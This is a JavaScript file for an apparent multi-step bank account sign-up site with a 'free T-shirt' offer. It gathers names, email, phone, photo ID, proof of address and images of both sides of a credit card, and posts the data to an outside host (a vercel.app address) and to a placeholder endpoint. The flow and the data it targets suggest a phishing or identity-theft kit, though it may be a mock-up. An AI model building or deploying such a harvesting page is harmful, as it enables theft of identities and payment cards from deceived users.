// Navigation function (removed duplicate definition)
function goToPage(page) {
    window.location.href = page;
}

// Event listener for form submission in personalInfoForm
document.getElementById("personalInfoForm").addEventListener("submit", function (e) {
    e.preventDefault(); // Prevent default form submission

    // Collect form data
    const personalInfo = {
        firstName: document.getElementById("firstName").value,
        middleName: document.getElementById("middleName").value || "N/A",
        lastName: document.getElementById("lastName").value,
        accountType: document.getElementById("accountType").value,
        country: document.getElementById("country").value,
    };

    // Send data to backend
    fetch("https://bank-backend-gold.vercel.app", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(personalInfo),
    })
    .then(response => response.json())
    .then(data => {
        console.log("Data submitted successfully:", data);
        window.location.href = "page2.html"; // Navigate to the next page
    })
    .catch(error => {
        console.error("Error:", error);
        alert("An error occurred. Please try again later.");
    });
});

// Event listener for form submission in verificationForm
document.getElementById('verificationForm').addEventListener('submit', function (e) {
    e.preventDefault();

    // Collect form data
    const formData = new FormData(this);

    // Debugging: Log form data to the console
    for (let [key, value] of formData.entries()) {
        console.log(`${key}: ${value}`);
    }

    // Proceed to the next page
    window.location.href = 'page5.html';
});

// Function to populate summary on page 5
function populateSummary() {
    // Use sessionStorage to store and retrieve the form data across pages
    document.getElementById("fullNameDisplay").textContent = sessionStorage.getItem("fullName") || "N/A";
    document.getElementById("emailDisplay").textContent = sessionStorage.getItem("email") || "N/A";
    document.getElementById("phoneDisplay").textContent = sessionStorage.getItem("phone") || "N/A";
    document.getElementById("photoIdDisplay").textContent = sessionStorage.getItem("photoId") || "N/A";
    document.getElementById("proofOfAddressDisplay").textContent = sessionStorage.getItem("proofOfAddress") || "N/A";
    document.getElementById("creditCardFrontDisplay").textContent = sessionStorage.getItem("creditCardFront") || "N/A";
    document.getElementById("creditCardBackDisplay").textContent = sessionStorage.getItem("creditCardBack") || "N/A";
}

// Call populateSummary when the page loads
document.addEventListener("DOMContentLoaded", populateSummary);

// Confirm button click handler
document.getElementById("confirmButton").addEventListener("click", function () {
    // Send the real data to the backend
    const formData = {
        fullName: sessionStorage.getItem("fullName"),
        email: sessionStorage.getItem("email"),
        phone: sessionStorage.getItem("phone"),
        // Add other fields as needed
    };

    fetch("https://your-backend-endpoint.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
    })
    .then(response => response.json())
    .then(data => {
        console.log("Data sent to backend:", data);
        alert("Your account has been successfully created!");
        window.location.href = "success.html";
    })
    .catch(error => {
        console.error("Error:", error);
        alert("There was an error. Please try again later.");
    });
});

// Responsive menu toggle
const menuToggle = document.getElementById('mobile-menu');
const navList = document.querySelector('.nav-list');

menuToggle.addEventListener('click', () => {
    navList.classList.toggle('active');
});

// T-shirt order form submission
document.getElementById("giftForm").addEventListener("submit", function (e) {
    const selectedSize = document.querySelector('input[name="size"]:checked').value;
    console.log("Selected T-Shirt Size:", selectedSize);

    // Allow form submission
    alert(`Your order for a free T-Shirt (Size: ${selectedSize}) has been placed!`);
});